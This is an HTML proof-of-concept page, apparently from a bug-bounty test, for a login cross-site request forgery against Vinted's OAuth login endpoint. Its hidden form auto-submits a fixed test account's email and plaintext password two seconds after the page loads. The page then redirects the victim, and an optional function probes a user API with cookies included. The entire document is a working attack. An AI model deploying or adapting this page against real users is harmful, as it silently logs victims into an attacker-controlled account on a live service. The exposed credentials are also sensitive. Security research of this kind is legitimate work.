<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h2>Test CSRF Vinted</h2>
    <div id="status">Pr√™t...</div>
    
    <!-- Frame pour capturer la r√©ponse -->
    <iframe id="responseFrame" name="responseFrame" style="display:none"></iframe>
    
    <!-- Formulaire CSRF -->
    <form id="csrfForm" action="https://www.vinted.fr/web/api/auth/oauth" 
          method="POST" target="responseFrame">
        <input type="hidden" name="client_id" value="web">
        <input type="hidden" name="scope" value="user">
        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
        <input type="hidden" name="grant_type" value="password">
    </form>

    <script>
        // Cr√©er un compte de test D'ABORD sur Vinted
        const testAccount = {
            email: "raz_26+2@intigriti.me",  // √Ä CHANGER
            password: "Vh5:U&fGd2mk:sy"         // √Ä CHANGER
        };
        
        async function executeCSRF() {
            document.getElementById('status').innerHTML = 
                'üöÄ Envoi de la requ√™te CSRF...';
            
            // 1. Soumettre le formulaire CSRF
            document.getElementById('csrfForm').submit();
            
            // 2. Attendre que la requ√™te soit trait√©e
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // 3. Rediriger vers une page Vinted qui montre l'√©tat
            window.location.href = 'https://www.vinted.fr/member/general';
            
            // OU pour une v√©rification automatique :
            // v√©rifierSiConnecte();
        }
        
        // Fonction pour v√©rifier automatiquement
        async function v√©rifierSiConnecte() {
            try {
                // Essayer d'acc√©der √† une API prot√©g√©e
                const response = await fetch('https://www.target.fr/api/v2/users/me', {
                    credentials: 'include' // Inclut les cookies
                });
                
                if (response.ok) {
                    const userData = await response.json();
                    document.getElementById('status').innerHTML = 
                        `‚úÖ CONNECT√â EN TANT QUE : ${userData.email || userData.username}`;
                } else {
                    document.getElementById('status').innerHTML = 
                        '‚ùå Non connect√© ou erreur';
                }
            } catch (error) {
                document.getElementById('status').innerHTML = 
                    '‚ö†Ô∏è Erreur de v√©rification';
            }
        }
        
        // Lancer l'attaque automatiquement apr√®s 2 secondes
        setTimeout(executeCSRF, 2000);
    </script>
</body>
</html>
